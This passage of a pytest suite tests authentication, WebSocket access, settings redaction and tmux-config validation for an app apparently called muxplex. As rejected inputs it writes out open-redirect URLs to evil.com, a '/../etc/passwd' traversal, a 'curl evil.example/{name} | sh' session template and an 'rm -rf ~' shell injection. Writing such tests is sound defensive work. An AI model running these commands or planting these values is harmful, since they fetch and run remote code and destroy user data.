    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-pw-for-api")

    with TestClient(app, base_url="http://192.168.1.1") as c:
        response = c.get("/health", follow_redirects=False)
        # Should be redirected to /login or get 307/401
        assert response.status_code in (307, 401)


# ---------------------------------------------------------------------------
# Login stub and auth mode endpoint
# ---------------------------------------------------------------------------


def test_get_login_returns_200_html(client):
    """GET /login returns 200 with HTML content."""
    response = client.get("/login")
    assert response.status_code == 200
    assert "text/html" in response.headers["content-type"]
    assert "<form" in response.text


def test_get_auth_mode_returns_json(client):
    """GET /auth/mode returns JSON with mode field."""
    response = client.get("/auth/mode")
    assert response.status_code == 200
    data = response.json()
    assert "mode" in data
    assert data["mode"] in ("pam", "password")


def test_get_login_injects_muxplex_auth(client):
    """GET /login returns 200 with MUXPLEX_AUTH injected into HTML."""
    response = client.get("/login")
    assert response.status_code == 200
    assert "MUXPLEX_AUTH" in response.text
    assert '"mode"' in response.text


# ---------------------------------------------------------------------------
# GET /login?next= — carried through as window.MUXPLEX_NEXT
# ---------------------------------------------------------------------------


def test_get_login_injects_valid_next_param(client):
    """GET /login?next=/deck/ injects the validated value as MUXPLEX_NEXT."""
    response = client.get("/login?next=/deck/")
    assert response.status_code == 200
    assert 'window.MUXPLEX_NEXT = "/deck/";' in response.text


def test_get_login_rejects_hostile_next_param(client):
    """GET /login?next=<absolute URL> injects '/' -- the hostile value never
    reaches the page at all, not even inside the rejected JSON."""
    response = client.get("/login?next=http://evil.com/phish")
    assert response.status_code == 200
    assert 'window.MUXPLEX_NEXT = "/";' in response.text
    assert "evil.com" not in response.text


def test_get_login_rejects_protocol_relative_next_param(client):
    """GET /login?next=//evil.com injects '/' -- protocol-relative rejected."""
    response = client.get("/login?next=//evil.com")
    assert response.status_code == 200
    assert 'window.MUXPLEX_NEXT = "/";' in response.text
    assert "evil.com" not in response.text


def test_get_login_rejects_path_traversal_next_param(client):
    """GET /login?next=/../etc/passwd injects '/' -- traversal rejected."""
    response = client.get("/login?next=/../etc/passwd")
    assert response.status_code == 200
    assert 'window.MUXPLEX_NEXT = "/";' in response.text


def test_get_login_no_next_param_injects_root(client):
    """GET /login with no ?next= injects the default '/'."""
    response = client.get("/login")
    assert response.status_code == 200
    assert 'window.MUXPLEX_NEXT = "/";' in response.text


# ---------------------------------------------------------------------------
# POST /login
# ---------------------------------------------------------------------------


def test_post_login_correct_password_redirects_to_root(monkeypatch):
    """POST /login with correct password: 303 redirect to / with muxplex_session cookie."""
    import muxplex.main as main_module

    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")
    monkeypatch.setattr(main_module, "_auth_mode", "password")
    monkeypatch.setattr(main_module, "_auth_password", "test-password")

    with TestClient(app, follow_redirects=False) as c:
        response = c.post(
            "/login", data={"username": "user", "password": "test-password"}
        )

    assert response.status_code == 303
    assert response.headers["location"] == "/"
    assert "muxplex_session" in response.cookies


def test_post_login_wrong_password_redirects_to_login_error(monkeypatch):
    """POST /login with wrong password: 303 redirect to /login?error=1."""
    import muxplex.main as main_module

    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")
    monkeypatch.setattr(main_module, "_auth_mode", "password")
    monkeypatch.setattr(main_module, "_auth_password", "test-password")

    with TestClient(app, follow_redirects=False) as c:
        response = c.post(
            "/login", data={"username": "user", "password": "wrong-password"}
        )

    assert response.status_code == 303
    assert "error=1" in response.headers["location"]


def test_post_login_pam_mode_correct_creds(monkeypatch):
    """POST /login in PAM mode with correct creds: 303 to / with muxplex_session cookie."""
    import muxplex.main as main_module

    monkeypatch.setattr(main_module, "_auth_mode", "pam")
    monkeypatch.setattr("muxplex.main.authenticate_pam", lambda u, p: True)

    with TestClient(app, follow_redirects=False) as c:
        response = c.post("/login", data={"username": "user", "password": "correct"})

    assert response.status_code == 303
    assert response.headers["location"] == "/"
    assert "muxplex_session" in response.cookies


def test_post_login_pam_mode_wrong_creds(monkeypatch):
    """POST /login in PAM mode with wrong creds: 303 redirect to /login?error=1."""
    import muxplex.main as main_module

    monkeypatch.setattr(main_module, "_auth_mode", "pam")
    monkeypatch.setattr("muxplex.main.authenticate_pam", lambda u, p: False)

    with TestClient(app, follow_redirects=False) as c:
        response = c.post("/login", data={"username": "user", "password": "wrong"})

    assert response.status_code == 303
    assert "error=1" in response.headers["location"]


# ---------------------------------------------------------------------------
# GET /auth/logout
#
# Note: these tests intentionally bypass the shared `client` fixture.
# The `client` fixture pre-injects a valid muxplex_session cookie; these
# tests verify that logout works correctly even for an unauthenticated
# (or expired-session) request, so they create their own TestClient.
# ---------------------------------------------------------------------------


def test_logout_redirects_to_login(monkeypatch):
    """GET /auth/logout returns 303 redirect to /login."""
    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")

    with TestClient(app, follow_redirects=False) as c:
        response = c.get("/auth/logout")

    assert response.status_code == 303
    assert "/login" in response.headers["location"]


def test_logout_clears_session_cookie(monkeypatch):
    """GET /auth/logout clears muxplex_session cookie (Set-Cookie with max-age=0)."""
    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")

    with TestClient(app, follow_redirects=False) as c:
        response = c.get("/auth/logout")

    assert response.status_code == 303
    set_cookie = response.headers.get("set-cookie", "")
    assert "muxplex_session" in set_cookie
    assert "max-age=0" in set_cookie.lower()


# ---------------------------------------------------------------------------
# WebSocket auth tests
# ---------------------------------------------------------------------------


def _wrap_with_client_host(wrapped_app, host: str):
    """Return an ASGI wrapper that forces websocket scope client to `host`.

    This lets tests simulate a WebSocket connection appearing to originate
    from a specific IP without touching Starlette internals.
    """

    async def _middleware(scope, receive, send):
        if scope.get("type") == "websocket":
            scope = {**scope, "client": (host, 50000)}
        await wrapped_app(scope, receive, send)

    return _middleware


def test_ws_localhost_no_cookie_is_rejected():
    """WebSocket from 127.0.0.1 with no cookie/Bearer is rejected with 4001,
    same as any other unauthenticated caller.

    This is the fix for GHSA-7c6r-fvrh-9qp4: the terminal WebSocket carries
    live scrollback and keystroke input, so an unauthenticated bypass here
    is at least as dangerous as the HTTP one, and a re-originated proxy
    connection (socat, `ssh -L`, a userspace container port-forward)
    presents the identical 127.0.0.1 peer for a genuinely remote caller --
    there is no socket-level signal to tell the two apart.
    """
    from starlette.websockets import WebSocketDisconnect

    # Force scope to look like localhost -- must now be rejected same as
    # any other unauthenticated peer.
    localhost_app = _wrap_with_client_host(app, "127.0.0.1")

    with TestClient(localhost_app) as c, pytest.raises(WebSocketDisconnect) as exc_info:
        with c.websocket_connect("/terminal/ws") as _:
            pass
    assert exc_info.value.code == 4001


def test_ws_localhost_with_valid_cookie_still_accepted():
    """A loopback caller WITH a real credential (session cookie) is still
    accepted -- the fix removes the free pass, not loopback access itself."""
    from starlette.websockets import WebSocketDisconnect

    from muxplex.auth import create_session_cookie
    from muxplex.main import _auth_secret, _auth_ttl

    cookie = create_session_cookie(_auth_secret, _auth_ttl)
    localhost_app = _wrap_with_client_host(app, "127.0.0.1")

    with TestClient(localhost_app) as c:
        c.cookies["muxplex_session"] = cookie
        try:
            with c.websocket_connect("/terminal/ws") as _:
                pass  # connection was accepted
        except WebSocketDisconnect as e:
            # ttyd is not running in this unit test, so the proxy fails and
            # closes with a non-4001 code once past the auth check.
            assert e.code != 4001, (
                f"Cookie-authenticated localhost WebSocket should not be "
                f"rejected as unauthorized; got close code {e.code}"
            )


def test_ws_valid_cookie_non_localhost_not_rejected_4001():
    """WebSocket from non-localhost with a valid cookie is not rejected with 4001."""
    from starlette.websockets import WebSocketDisconnect

    from muxplex.auth import create_session_cookie
    from muxplex.main import _auth_secret, _auth_ttl

    cookie = create_session_cookie(_auth_secret, _auth_ttl)

    # TestClient default host is "testclient" — treated as non-localhost
    with TestClient(app) as c:
        c.cookies["muxplex_session"] = cookie
        try:
            with c.websocket_connect("/terminal/ws") as _:
                pass  # connection was accepted — auth passed
        except WebSocketDisconnect as e:
            # Auth passed; ttyd not running → proxy fails → close with code != 4001
            assert e.code != 4001, (
                f"Valid-cookie WebSocket should not be rejected; got close code {e.code}"
            )


def test_ws_no_cookie_non_localhost_rejected_4001():
    """WebSocket from non-localhost without a cookie is closed with code 4001."""
    from starlette.websockets import WebSocketDisconnect

    # TestClient default host "testclient" is treated as non-localhost
    with TestClient(app) as c, pytest.raises(WebSocketDisconnect) as exc_info:
        with c.websocket_connect("/terminal/ws") as _:
            pass
    assert exc_info.value.code == 4001


def test_ws_invalid_cookie_non_localhost_rejected_4001():
    """WebSocket from non-localhost with a tampered cookie is closed with code 4001."""
    from starlette.websockets import WebSocketDisconnect

    with TestClient(app) as c:
        c.cookies["muxplex_session"] = "tampered.invalid.cookie.value"
        with pytest.raises(WebSocketDisconnect) as exc_info:
            with c.websocket_connect("/terminal/ws") as _:
                pass
    assert exc_info.value.code == 4001


# ---------------------------------------------------------------------------
# GET /api/settings
# ---------------------------------------------------------------------------


def test_get_settings_returns_defaults(client, tmp_path, monkeypatch):
    """GET /api/settings returns 200 with default settings when no file exists."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.get("/api/settings")
    assert response.status_code == 200
    data = response.json()
    assert data["sort_order"] == "manual"
    assert data["new_session_template"] == "tmux new-session -d -s {name}"


def test_get_settings_returns_saved_values(client, tmp_path, monkeypatch):
    """GET /api/settings returns saved values when settings.json exists."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Pre-write a settings.json with a custom sort_order
    settings_path.write_text(json.dumps({"sort_order": "alphabetical"}))

    response = client.get("/api/settings")
    assert response.status_code == 200
    data = response.json()
    assert data["sort_order"] == "alphabetical"


def test_get_settings_default_session_filter_is_empty_string(
    client, tmp_path, monkeypatch
):
    """GET /api/settings returns session_filter == "" by default (muxplex-4h9)."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.get("/api/settings")
    assert response.status_code == 200
    assert response.json()["session_filter"] == ""


def test_get_settings_redacts_federation_key(client, tmp_path, monkeypatch):
    """GET /api/settings must NOT return the federation_key value — it must be empty string."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Save a settings file that includes a non-empty federation_key
    settings_path.write_text(json.dumps({"federation_key": "secret-should-not-appear"}))

    response = client.get("/api/settings")
    assert response.status_code == 200
    data = response.json()

    # The federation_key key may be present but its value must be empty
    assert data.get("federation_key") == "", (
        f"federation_key must be redacted (empty string), got: {data.get('federation_key')!r}"
    )
    # The secret must not appear anywhere in the response
    assert "secret-should-not-appear" not in str(data), (
        "federation_key secret value must not appear anywhere in the response"
    )


def test_get_settings_redacts_remote_instance_keys(client, tmp_path, monkeypatch):
    """GET /api/settings must redact the 'key' field from each item in remote_instances."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Save settings with remote_instances containing secret key fields
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://remote-a:8088",
                        "key": "remote-secret-key-a",
                        "name": "Remote A",
                        "id": "remote-a",
                    },
                    {
                        "url": "http://remote-b:8088",
                        "key": "remote-secret-key-b",
                        "name": "Remote B",
                        "id": "remote-b",
                    },
                ]
            }
        )
    )

    response = client.get("/api/settings")
    assert response.status_code == 200
    data = response.json()

    remote_instances = data.get("remote_instances", [])
    assert len(remote_instances) == 2, (
        f"Expected 2 remote_instances, got {len(remote_instances)}"
    )

    for i, inst in enumerate(remote_instances):
        assert inst.get("key") == "", (
            f"remote_instances[{i}]['key'] must be redacted (empty string), "
            f"got: {inst.get('key')!r}"
        )

    # The secrets must not appear anywhere in the response
    assert "remote-secret-key-a" not in str(data), (
        "remote-secret-key-a must not appear anywhere in the response"
    )
    assert "remote-secret-key-b" not in str(data), (
        "remote-secret-key-b must not appear anywhere in the response"
    )


# ---------------------------------------------------------------------------
# PATCH /api/settings
# ---------------------------------------------------------------------------


def test_patch_settings_updates_field(client, tmp_path, monkeypatch):
    """PATCH /api/settings with {sort_order: 'alphabetical'} returns 200 with updated sort_order and unchanged default_session."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.patch("/api/settings", json={"sort_order": "alphabetical"})
    assert response.status_code == 200
    data = response.json()
    assert data["sort_order"] == "alphabetical"
    assert data["default_session"] is None


def test_patch_settings_persists_session_filter(client, tmp_path, monkeypatch):
    """PATCH /api/settings with {session_filter: 'foo-*'} returns 200, round-trips
    in the response, and is written to disk (muxplex-4h9)."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.patch("/api/settings", json={"session_filter": "foo-*"})
    assert response.status_code == 200
    assert response.json()["session_filter"] == "foo-*"

    assert settings_mod.load_settings()["session_filter"] == "foo-*"


def test_patch_settings_ignores_unknown_keys(client, tmp_path, monkeypatch):
    """PATCH /api/settings with {unknown_key: 'value'} returns 200 without unknown_key."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.patch("/api/settings", json={"unknown_key": "value"})
    assert response.status_code == 200
    data = response.json()
    assert "unknown_key" not in data


# ---------------------------------------------------------------------------
# PATCH /api/settings -- operator-settable local keys
# (input_enabled / input_allowed_sessions; see
# settings.OPERATOR_SETTABLE_LOCAL_KEYS and main.update_settings())
# ---------------------------------------------------------------------------


def test_patch_settings_operator_can_enable_input(client, tmp_path, monkeypatch):
    """An operator (this fixture's cookie-authenticated client) PATCHing
    input_enabled: true must persist -- both in the response and on
    a subsequent load_settings()."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.patch("/api/settings", json={"input_enabled": True})
    assert response.status_code == 200
    assert response.json()["input_enabled"] is True

    assert settings_mod.load_settings()["input_enabled"] is True


def test_patch_settings_operator_can_set_input_allowed_sessions(
    client, tmp_path, monkeypatch
):
    """An operator PATCHing input_allowed_sessions: ["foo-*"] must persist,
    normalized exactly like the pre-existing local-file-edit path."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.patch("/api/settings", json={"input_allowed_sessions": ["foo-*"]})
    assert response.status_code == 200
    assert response.json()["input_allowed_sessions"] == ["foo-*"]

    assert settings_mod.load_settings()["input_allowed_sessions"] == ["foo-*"]


def _arm_real_federation_bearer(tmp_path, monkeypatch) -> str:
    """Wire up a GENUINE federation Bearer credential and return the key.

    Deliberately stubs NOTHING on the auth path -- neither AuthMiddleware nor
    ``main._bearer_only_caller``. Both real code paths read a real key from
    their own real source, so a request carrying
    ``Authorization: Bearer <returned key>`` is authorized by the actual
    middleware and classified by the actual classifier:

      1. AuthMiddleware's Bearer branch calls ``settings.load_federation_key()``
         FRESH FROM DISK on every request (auth.py), which honors the
         ``MUXPLEX_FEDERATION_KEY_FILE`` env override -- so pointing that at a
         tmp file containing the key is what makes the real middleware ACCEPT
         the header (without it: 401).
      2. ``main._bearer_only_caller()`` compares the header against the
         module-global ``main._federation_key`` (loaded once at import), so
         that global is set to the same key -- the same mechanism
         ``test_ws_proxy.py::test_ws_bearer_auth_accepted`` uses.
    """
    import muxplex.main as main_mod

    fed_key = "test-federation-key-operator-fence"
    key_file = tmp_path / "federation_key"
    key_file.write_text(fed_key)
    # (1) real AuthMiddleware -> load_federation_key() -> this file
    monkeypatch.setenv("MUXPLEX_FEDERATION_KEY_FILE", str(key_file))
    # (2) real _bearer_only_caller() -> this module global
    monkeypatch.setattr(main_mod, "_federation_key", fed_key)
    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")
    return fed_key


def test_patch_settings_real_bearer_caller_cannot_enable_input(
    tmp_path, monkeypatch, caplog
):
    """SECURITY (genuine end-to-end): a REAL federation-key Bearer request --
    no cookie, no stubbed classifier -- must be AUTHORIZED by the real
    AuthMiddleware and then have input_enabled dropped by the real
    ``_bearer_only_caller`` classification.

    Deliberately does NOT use the ``client`` fixture (which sets a valid
    session cookie, which would make the caller an operator) and does NOT
    monkeypatch ``_bearer_only_caller``. The Bearer header is the sole
    credential, exactly as a federation peer / headless agent presents it.
    """
    import logging

    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    fed_key = _arm_real_federation_bearer(tmp_path, monkeypatch)

    with TestClient(app) as c:
        # Control: with NO credential at all the real middleware 401s. This is
        # what proves the Bearer header below is genuinely doing the
        # authorizing -- not that auth is somehow open in this test setup.
        unauth = c.patch(
            "/api/settings",
            json={"input_enabled": True},
            headers={"Accept": "application/json"},
        )
        assert unauth.status_code == 401, (
            "Expected the real AuthMiddleware to reject a credential-less "
            f"PATCH with 401, got {unauth.status_code}"
        )

        with caplog.at_level(logging.WARNING, logger="muxplex.settings"):
            response = c.patch(
                "/api/settings",
                # A syncable key rides along in the SAME patch, so a wholesale
                # rejection cannot masquerade as a successful fence.
                json={"input_enabled": True, "sort_order": "alphabetical"},
                headers={"Authorization": f"Bearer {fed_key}"},
            )

    # Authorized -- the real middleware accepted the real Bearer header.
    assert response.status_code == 200, (
        f"Real Bearer request must be authorized, got {response.status_code}"
    )
    data = response.json()
    # ...but the fenced key was dropped by the real classifier.
    assert data["input_enabled"] is False
    # ...while the ordinary syncable key in the same patch DID apply, proving
    # the request was processed rather than wholesale-rejected.
    assert data["sort_order"] == "alphabetical"

    loaded = settings_mod.load_settings()
    assert loaded["input_enabled"] is False, (
        "A real federation-Bearer caller must NOT be able to enable input"
    )
    assert loaded["sort_order"] == "alphabetical"

    # The drop is silent to the HTTP response, but never silent to the log.
    assert any(
        "input_enabled" in record.message and "local-only" in record.message
        for record in caplog.records
    ), f"Expected a local-only warning log for input_enabled, got: {caplog.records}"


def test_patch_settings_forged_cookie_cannot_downgrade_real_bearer_caller(
    tmp_path, monkeypatch
):
    """SECURITY (genuine end-to-end): a FORGED muxplex_session cookie sent
    ALONGSIDE a real federation-key Bearer header must not launder the caller
    into operator status.

    The junk cookie fails ``verify_session_cookie`` in BOTH places that read
    it -- AuthMiddleware (so the request falls through to the Bearer branch
    and is authorized by the key alone) and ``_bearer_only_caller`` (so the
    caller stays classified bearer_only) -- therefore input_enabled must
    still be dropped. Nothing on the auth path is stubbed.
    """
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    fed_key = _arm_real_federation_bearer(tmp_path, monkeypatch)

    with TestClient(app) as c:
        c.cookies.set("muxplex_session", "forged.not-a-valid-signature.value")
        response = c.patch(
            "/api/settings",
            json={"input_enabled": True, "sort_order": "alphabetical"},
            headers={"Authorization": f"Bearer {fed_key}"},
        )

    assert response.status_code == 200, (
        f"Bearer header must still authorize the request, got {response.status_code}"
    )
    data = response.json()
    assert data["input_enabled"] is False
    assert data["sort_order"] == "alphabetical"

    loaded = settings_mod.load_settings()
    assert loaded["input_enabled"] is False, (
        "A forged cookie must not downgrade a Bearer caller to operator status"
    )
    assert loaded["sort_order"] == "alphabetical"


def test_patch_settings_real_bearer_caller_can_persist_session_filter(
    tmp_path, monkeypatch
):
    """SECURITY-ADJACENT (genuine end-to-end), muxplex-4h9: session_filter is
    syncable, NOT local-only -- a REAL federation-key Bearer-only caller (no
    cookie, no stubbed classifier) must still be able to persist it, proving
    it was not accidentally swept into the LOCAL_ONLY_KEYS fence alongside
    the genuinely dangerous command/path keys.

    Mirrors ``test_patch_settings_real_bearer_caller_cannot_enable_input``'s
    real-credential setup, but asserts the OPPOSITE outcome for this key:
    where that test proves ``input_enabled`` is dropped for a bearer_only
    caller, this proves ``session_filter`` is NOT dropped.
    """
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    fed_key = _arm_real_federation_bearer(tmp_path, monkeypatch)

    with TestClient(app) as c:
        response = c.patch(
            "/api/settings",
            json={"session_filter": "foo-*"},
            headers={"Authorization": f"Bearer {fed_key}"},
        )

    assert response.status_code == 200, (
        f"Real Bearer request must be authorized, got {response.status_code}"
    )
    data = response.json()
    assert data["session_filter"] == "foo-*"

    loaded = settings_mod.load_settings()
    assert loaded["session_filter"] == "foo-*", (
        "A bearer-only caller must be able to persist session_filter -- it is "
        "syncable, not local-only"
    )


def test_patch_settings_operator_still_cannot_set_other_local_only_keys(
    client, tmp_path, monkeypatch
):
    """OPERATOR_SETTABLE_LOCAL_KEYS is narrowly the two input-typing keys --
    an operator-credentialed PATCH must NOT be able to set any OTHER
    LOCAL_ONLY_KEYS member (e.g. new_session_template), even though this
    client is not bearer_only."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    custom = "curl evil.example/{name} | sh"
    response = client.patch("/api/settings", json={"new_session_template": custom})
    assert response.status_code == 200
    data = response.json()
    assert data["new_session_template"] != custom
    assert (
        data["new_session_template"]
        == settings_mod.DEFAULT_SETTINGS["new_session_template"]
    )


# ---------------------------------------------------------------------------
# deviceLabelPlacement (docs/plans/2026-08-04-device-label-placement-plan.md, test plan section 8.2)
# ---------------------------------------------------------------------------


def test_get_settings_exposes_device_label_placement(client, tmp_path, monkeypatch):
    """P19: GET /api/settings body contains deviceLabelPlacement."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.get("/api/settings")
    assert response.status_code == 200
    assert response.json()["deviceLabelPlacement"] == "titlebar"


def test_patch_device_label_placement_valid(client, tmp_path, monkeypatch):
    """P20: a valid PATCH updates placement and derives showDeviceBadges."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.patch("/api/settings", json={"deviceLabelPlacement": "corner"})
    assert response.status_code == 200
    data = response.json()
    assert data["deviceLabelPlacement"] == "corner"
    assert data["showDeviceBadges"] is True


def test_patch_device_label_placement_invalid_returns_400(
    client, tmp_path, monkeypatch
):
    """P21: an unknown value is a 400 carrying the discriminator + allowed list."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.patch("/api/settings", json={"deviceLabelPlacement": "banana"})
    assert response.status_code == 400
    body = response.json()
    assert body["unknown_device_label_placement"] is True
    assert body["allowed"] == ["corner", "off", "titlebar"]


def test_patch_device_label_placement_invalid_writes_nothing(
    client, tmp_path, monkeypatch
):
    """P22: a 400 for deviceLabelPlacement makes NO write -- not even to other
    keys in the same request."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.patch(
        "/api/settings", json={"deviceLabelPlacement": "banana", "fontSize": 99}
    )
    assert response.status_code == 400

    follow_up = client.get("/api/settings")
    assert follow_up.json()["fontSize"] != 99


# ---------------------------------------------------------------------------
# GET / PATCH /api/tmux-config
# ---------------------------------------------------------------------------


@pytest.fixture
def tmux_config_sandbox(tmp_path, monkeypatch):
    """Redirect every path the tmux-config endpoints touch into an isolated
    fake HOME, matching test_tmux_config.py's ``sandbox`` fixture, and stub
    ``apply_live()`` so these API-level tests never invoke a real tmux
    subprocess -- render_fragments()/status()/apply_live() themselves are
    already covered by test_tmux_config.py's dedicated sandbox.
    """
    import muxplex.settings as settings_mod
    from muxplex import tmux_config as tc

    home = tmp_path / "home"
    (home / ".config" / "muxplex").mkdir(parents=True)
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", home / "settings.json")
    monkeypatch.setattr(tc, "TMUX_CONF_PATH", home / ".tmux.conf")
    monkeypatch.setattr(
        tc, "XDG_TMUX_CONF_PATH", home / ".config" / "tmux" / "tmux.conf"
    )
    monkeypatch.setattr(tc, "TMUX_D_PATH", home / ".config" / "muxplex" / "tmux.d")
    monkeypatch.setattr(
        tc, "apply_live", lambda socket=None: {"applied": False, "reason": "test stub"}
    )
    return home


def test_get_tmux_config_shape(client, tmux_config_sandbox):
    """GET /api/tmux-config returns exactly installed/theme/available_themes/
    copy_mode/preview, with defaults when nothing has been configured yet."""
    response = client.get("/api/tmux-config")
    assert response.status_code == 200
    data = response.json()
    assert set(data.keys()) == {
        "installed",
        "theme",
        "available_themes",
        "copy_mode",
        "preview",
    }
    assert data["installed"] is False
    assert data["theme"] == "brand"
    assert "brand" in data["available_themes"]
    assert data["copy_mode"] == "desktop"
    assert isinstance(data["preview"], str) and data["preview"]
    assert "muxplex never writes this file" not in data["preview"], (
        "preview must exclude the user's own 90-local.conf"
    )


def test_get_tmux_config_desktop_preview_has_no_vi_bindings(
    client, tmux_config_sandbox
):
    response = client.get("/api/tmux-config")
    assert "mode-keys vi" not in response.json()["preview"]


def test_patch_tmux_config_updates_theme_and_copy_mode(client, tmux_config_sandbox):
    """PATCH persists both fields, re-renders, and reflects the change in the
    same response's preview -- and a subsequent GET confirms persistence."""
    response = client.patch(
        "/api/tmux-config", json={"theme": "steel", "copy_mode": "vi"}
    )
    assert response.status_code == 200
    data = response.json()
    assert data["theme"] == "steel"
    assert data["copy_mode"] == "vi"
    assert "mode-keys vi" in data["preview"]

    follow_up = client.get("/api/tmux-config").json()
    assert follow_up["theme"] == "steel"
    assert follow_up["copy_mode"] == "vi"


def test_patch_tmux_config_partial_body_keeps_other_field(client, tmux_config_sandbox):
    """Omitting a field leaves its current (persisted) value untouched."""
    client.patch("/api/tmux-config", json={"theme": "steel", "copy_mode": "vi"})
    response = client.patch("/api/tmux-config", json={"theme": "brand"})
    assert response.status_code == 200
    data = response.json()
    assert data["theme"] == "brand"
    assert data["copy_mode"] == "vi", "omitted copy_mode must keep its persisted value"


def test_patch_tmux_config_rejects_unknown_theme(client, tmux_config_sandbox):
    """CONSTRAINED VOCABULARY: an unknown theme is a 400, never accepted."""
    response = client.patch("/api/tmux-config", json={"theme": "no-such-theme"})
    assert response.status_code == 400
    assert "no-such-theme" in response.json()["detail"]


def test_patch_tmux_config_rejects_unknown_copy_mode(client, tmux_config_sandbox):
    """CONSTRAINED VOCABULARY: only 'desktop'/'vi' are valid -- anything else,
    including a plausible-sounding tmux term like 'emacs', is a 400."""
    response = client.patch("/api/tmux-config", json={"copy_mode": "emacs"})
    assert response.status_code == 400
    assert "emacs" in response.json()["detail"]


def test_patch_tmux_config_rejects_free_text_copy_mode(client, tmux_config_sandbox):
    """There is no escape hatch: arbitrary text is rejected exactly like a
    plausible-but-wrong value -- this endpoint has no free-text field."""
    response = client.patch(
        "/api/tmux-config", json={"copy_mode": "run-shell 'rm -rf ~'"}
    )
    assert response.status_code == 400


def test_patch_tmux_config_rejected_copy_mode_makes_no_partial_write(
    client, tmux_config_sandbox
):
    """An invalid copy_mode must reject the WHOLE patch -- theme must not be
    updated either, even though it was valid in the same request body."""
    client.patch("/api/tmux-config", json={"theme": "steel"})
    response = client.patch(
        "/api/tmux-config", json={"theme": "brand", "copy_mode": "emacs"}
    )
    assert response.status_code == 400
    follow_up = client.get("/api/tmux-config").json()
    assert follow_up["theme"] == "steel", "rejected patch must not partially apply"


# ---------------------------------------------------------------------------
# PATCH /api/settings -- expected_settings_updated_at (optimistic concurrency)
# ---------------------------------------------------------------------------


def test_patch_settings_cas_omitted_behaves_as_before(client, tmp_path, monkeypatch):
    """Omitting expected_settings_updated_at is fully backward compatible: 200, write applies."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    response = client.patch("/api/settings", json={"sort_order": "alphabetical"})
    assert response.status_code == 200
    assert response.json()["sort_order"] == "alphabetical"


def test_patch_settings_cas_match_applies_write(client, tmp_path, monkeypatch):
    """A correct expected_settings_updated_at (matching current) returns 200 and applies the write."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    current_ts = client.get("/api/settings").json()["settings_updated_at"]

    response = client.patch(
        "/api/settings",
        json={
            "sort_order": "alphabetical",
            "expected_settings_updated_at": current_ts,
        },
    )
    assert response.status_code == 200
    assert response.json()["sort_order"] == "alphabetical"


def test_patch_settings_cas_mismatch_returns_409_no_write(
    client, tmp_path, monkeypatch
):
    """A stale expected_settings_updated_at returns 409 and makes NO write."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    # Bump settings_updated_at once so the "current" timestamp is nonzero,
    # then attempt a PATCH with a deliberately stale (older) expectation.
    client.patch("/api/settings", json={"sort_order": "alphabetical"})
    stale_ts = -1.0  # guaranteed not to equal the real settings_updated_at

    response = client.patch(
        "/api/settings",
        json={
            "sort_order": "recent",
            "expected_settings_updated_at": stale_ts,
        },
    )
    assert response.status_code == 409
    body = response.json()
    assert "settings_updated_at" in body

    # No write happened: sort_order must still be the prior value, not "recent".
    after = client.get("/api/settings").json()
    assert after["sort_order"] == "alphabetical"


def test_patch_settings_cas_response_includes_current_timestamp(
    client, tmp_path, monkeypatch
):
    """A 409 response body's settings_updated_at equals the server's actual current value."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")

    real_ts = client.get("/api/settings").json()["settings_updated_at"]

    response = client.patch(
        "/api/settings",
        json={"sort_order": "recent", "expected_settings_updated_at": real_ts - 1.0},
    )
    assert response.status_code == 409
    assert response.json()["settings_updated_at"] == real_ts


def test_patch_settings_cas_field_not_written_as_a_setting(
